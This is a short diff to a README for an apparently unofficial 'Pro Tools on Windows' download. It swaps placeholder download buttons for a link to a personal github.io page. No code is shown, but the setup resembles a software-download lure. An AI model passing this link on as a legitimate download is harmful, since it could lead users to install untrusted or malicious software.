@@ -17,7 +17,7 @@ A single Pro Tools on Windows deployment covers both portable and installed mode
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://alicebrown323.github.io/pro-tools-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ Coexistence with other installations of similar software is supported when progr
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://alicebrown323.github.io/pro-tools-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
